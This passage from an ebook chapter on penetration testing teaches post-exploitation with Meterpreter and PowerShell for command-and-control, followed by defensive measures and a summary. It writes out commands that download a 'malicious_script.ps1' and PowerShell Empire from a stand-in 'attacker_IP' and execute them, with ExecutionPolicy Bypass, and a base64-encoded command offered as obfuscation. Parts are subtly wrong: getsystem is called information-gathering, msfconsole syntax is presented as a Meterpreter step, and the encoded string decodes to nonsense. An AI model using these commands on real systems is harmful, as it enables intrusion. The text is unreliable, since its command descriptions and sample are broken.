<p><span class="koboSpan" id="kobo.234.1">We can use Meterpreter </span><a id="_idIndexMarker941"/><span class="koboSpan" id="kobo.235.1">to profile a target system using the </span><strong class="source-inline"><span class="koboSpan" id="kobo.236.1">sysinfo</span></strong><span class="koboSpan" id="kobo.237.1"> and </span><strong class="source-inline"><span class="koboSpan" id="kobo.238.1">getsystem</span></strong><span class="koboSpan" id="kobo.239.1"> commands. </span><span class="koboSpan" id="kobo.239.2">These commands create a detailed report documenting the capabilities of a </span><span class="No-Break"><span class="koboSpan" id="kobo.240.1">target system:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.241.1">
# Display system information
sysinfo
# Gather information about the target machine
getsystem</span></pre> <h3><span class="koboSpan" id="kobo.242.1">Privilege escalation</span></h3>
<p><span class="koboSpan" id="kobo.243.1">We can use Meterpreter</span><a id="_idIndexMarker942"/><span class="koboSpan" id="kobo.244.1"> to load modules that support a wide variety of functions. </span><span class="koboSpan" id="kobo.244.2">In the following, we will use Meterpreter to load a module that will attempt </span><span class="No-Break"><span class="koboSpan" id="kobo.245.1">privilege escalation:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.246.1">
# Attempt privilege escalation using known exploits
use post/windows/escalate/getsystem</span></pre> <h2 id="_idParaDest-475"><a id="_idTextAnchor473"/><span class="koboSpan" id="kobo.247.1">Integrating PowerShell for enhanced capabilities</span></h2>
<p><span class="koboSpan" id="kobo.248.1">To enhance post-exploitation capabilities, we can</span><a id="_idIndexMarker943"/><span class="koboSpan" id="kobo.249.1"> utilize PowerShell within the Meterpreter shell. </span><span class="koboSpan" id="kobo.249.2">This allows us to use PowerShell’s extensive functionalities for stealthier and more </span><span class="No-Break"><span class="koboSpan" id="kobo.250.1">flexible operations:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.251.1">
# Launch PowerShell within Meterpreter
powershell_shell</span></pre> <p><span class="koboSpan" id="kobo.252.1">Now, we have a PowerShell prompt within the </span><span class="No-Break"><span class="koboSpan" id="kobo.253.1">Meterpreter shell:</span></span></p>
<ul>
<li><span class="koboSpan" id="kobo.254.1">Command execution </span><span class="No-Break"><span class="koboSpan" id="kobo.255.1">with PowerShell:</span></span><pre class="source-code"><span class="koboSpan" id="kobo.256.1">
# Execute PowerShell commands
(Get-WmiObject Win32_ComputerSystem).Name</span></pre><p class="list-inset"><span class="koboSpan" id="kobo.257.1">This example retrieves the computer name using PowerShell within the </span><span class="No-Break"><span class="koboSpan" id="kobo.258.1">Meterpreter session.</span></span></p></li> <li><span class="koboSpan" id="kobo.259.1">Download and execute </span><span class="No-Break"><span class="koboSpan" id="kobo.260.1">PowerShell scripts:</span></span><pre class="source-code"><span class="koboSpan" id="kobo.261.1">
# Download a PowerShell script
Invoke-WebRequest -Uri http://attacker_IP/script.ps1 -OutFile C:\malicious_script.ps1
# Execute the downloaded script
C:\malicious_script.ps1</span></pre><p class="list-inset"><span class="koboSpan" id="kobo.262.1">This demonstrates how PowerShell can be used within Meterpreter to download and execute </span><span class="No-Break"><span class="koboSpan" id="kobo.263.1">malicious scripts.</span></span></p></li> </ul>
<h2 id="_idParaDest-476"><a id="_idTextAnchor474"/><span class="koboSpan" id="kobo.264.1">Obfuscating PowerShell commands</span></h2>
<p><span class="koboSpan" id="kobo.265.1">To evade detection, attackers</span><a id="_idIndexMarker944"/><span class="koboSpan" id="kobo.266.1"> often obfuscate PowerShell commands. </span><span class="koboSpan" id="kobo.266.2">In the context of Meterpreter, PowerShell commands can be obfuscated to make analysis </span><span class="No-Break"><span class="koboSpan" id="kobo.267.1">more challenging:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.268.1">
# Obfuscate a simple PowerShell command
powershell -enc JABzAHMAaQBtAGUAbgB0AC4AbgBuAGUAdwAtAGwAZQBuAGEAcwBrAGUAbgAuAEwAbwBnAGcA</span></pre> <p><span class="koboSpan" id="kobo.269.1">This example showcases obfuscation using </span><span class="No-Break"><span class="koboSpan" id="kobo.270.1">base64 encoding.</span></span></p>
<h2 id="_idParaDest-477"><a id="_idTextAnchor475"/><span class="koboSpan" id="kobo.271.1">Using PowerShell for C2</span></h2>
<p><span class="koboSpan" id="kobo.272.1">Now, let’s explore using</span><a id="_idIndexMarker945"/><span class="koboSpan" id="kobo.273.1"> PowerShell </span><a id="_idIndexMarker946"/><span class="koboSpan" id="kobo.274.1">within Meterpreter for C2. </span><span class="koboSpan" id="kobo.274.2">This involves establishing a persistent connection between the attacker and the compromised system. </span><span class="koboSpan" id="kobo.274.3">Assuming PowerShell Empire has been staged on an external server, we can download and execute it </span><span class="No-Break"><span class="koboSpan" id="kobo.275.1">within Meterpreter:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.276.1">
# Download PowerShell Empire
Invoke-WebRequest -Uri http://attacker_IP/powershell_empire.ps1 -OutFile C:\powershell_empire.ps1
# Execute PowerShell Empire
powershell -ExecutionPolicy Bypass -File C:\powershell_empire.ps1</span></pre> <p><span class="koboSpan" id="kobo.277.1">This demonstrates how Meterpreter, once established, can leverage PowerShell to download and execute more advanced </span><span class="No-Break"><span class="koboSpan" id="kobo.278.1">post-exploitation frameworks.</span></span></p>
<h2 id="_idParaDest-478"><a id="_idTextAnchor476"/><span class="koboSpan" id="kobo.279.1">Defensive measures</span></h2>
<p><span class="koboSpan" id="kobo.280.1">To defend against attacks</span><a id="_idIndexMarker947"/><span class="koboSpan" id="kobo.281.1"> leveraging Meterpreter and PowerShell, organizations</span><a id="_idIndexMarker948"/><span class="koboSpan" id="kobo.282.1"> should implement robust </span><span class="No-Break"><span class="koboSpan" id="kobo.283.1">security measures:</span></span></p>
<ul>
<li><strong class="bold"><span class="koboSpan" id="kobo.284.1">Network monitoring</span></strong><span class="koboSpan" id="kobo.285.1">: Employ network monitoring tools to detect unusual traffic patterns </span><span class="No-Break"><span class="koboSpan" id="kobo.286.1">or connections</span></span></li>
<li><strong class="bold"><span class="koboSpan" id="kobo.287.1">Endpoint protection</span></strong><span class="koboSpan" id="kobo.288.1">: Utilize endpoint protection solutions to detect and block </span><span class="No-Break"><span class="koboSpan" id="kobo.289.1">malicious activities</span></span></li>
<li><strong class="bold"><span class="koboSpan" id="kobo.290.1">Application whitelisting</span></strong><span class="koboSpan" id="kobo.291.1">: Restrict the execution of unauthorized applications, including </span><span class="No-Break"><span class="koboSpan" id="kobo.292.1">PowerShell scripts</span></span></li>
<li><strong class="bold"><span class="koboSpan" id="kobo.293.1">Regular audits and patching</span></strong><span class="koboSpan" id="kobo.294.1">: Regularly audit systems for vulnerabilities and apply patches to mitigate known </span><span class="No-Break"><span class="koboSpan" id="kobo.295.1">security issues</span></span></li>
<li><strong class="bold"><span class="koboSpan" id="kobo.296.1">User education</span></strong><span class="koboSpan" id="kobo.297.1">: Educate users</span><a id="_idIndexMarker949"/><span class="koboSpan" id="kobo.298.1"> about the risks of opening unknown files or clicking on </span><span class="No-Break"><span class="koboSpan" id="kobo.299.1">suspicious links</span></span></li>
</ul>
<p><span class="koboSpan" id="kobo.300.1">In summary, the combination</span><a id="_idIndexMarker950"/><span class="koboSpan" id="kobo.301.1"> of Meterpreter and PowerShell poses a significant threat in the hands of attackers during post-exploitation. </span><span class="koboSpan" id="kobo.301.2">Understanding their functionalities and employing effective defensive measures is crucial for organizations to mitigate the risks associated with such sophisticated attack techniques. </span><span class="koboSpan" id="kobo.301.3">Regularly updating systems, monitoring network traffic, and educating users are essential to maintaining a resilient </span><span class="No-Break"><span class="koboSpan" id="kobo.302.1">security posture.</span></span></p>
<h1 id="_idParaDest-479"><a id="_idTextAnchor477"/><span class="koboSpan" id="kobo.303.1">Summary</span></h1>
<p><span class="koboSpan" id="kobo.304.1">In this chapter, we navigated the intricate realm of using PowerShell for C2 in the context of penetration testing. </span><span class="koboSpan" id="kobo.304.2">Beginning with foundational insights, we explored how PowerShell, a tool designed for legitimate administrative tasks, can be harnessed by both defenders and attackers. </span><span class="koboSpan" id="kobo.304.3">The chapter unveiled the artistry behind weaponizing PowerShell for post-exploitation activities, offering practical examples that guided you through the nuances of executing commands, infiltrating systems, and evading detection. </span><span class="koboSpan" id="kobo.304.4">From leveraging built-in cmdlets to executing complex obfuscation techniques, you gained a comprehensive understanding of the tactics employed by adversaries during penetration tests. </span><span class="koboSpan" id="kobo.304.5">This chapter emphasized PowerShell’s dual nature – a powerful asset for defenders seeking to fortify their cybersecurity measures and a potent weapon for adversaries navigating networks. </span><span class="koboSpan" id="kobo.304.6">Practical scenarios allowed you to emulate adversarial tactics within a controlled environment, empowering you to strengthen your defenses proactively. </span><span class="koboSpan" id="kobo.304.7">As we delved into the adversary’s perspective, the chapter provided actionable insights for security professionals, enabling them to fortify their cyber defenses proactively. </span><span class="koboSpan" id="kobo.304.8">By mastering the dynamic landscape of PowerShell-based C2, you gained a strategic advantage in the perpetual cat-and-mouse penetration testing game. </span><span class="koboSpan" id="kobo.304.9">The knowledge imparted in this chapter is a valuable resource for security practitioners aiming to stay one step ahead in the ever-evolving </span><span class="No-Break"><span class="koboSpan" id="kobo.305.1">cybersecurity landscape.</span></span></p>
<p><span class="koboSpan" id="kobo.306.1">In the next chapter, we will delve into the powerful realm of post-exploitation using PowerShell in the Microsoft </span><span class="No-Break"><span class="koboSpan" id="kobo.307.1">Windows environment.</span></span></p>
</div>
</body></html>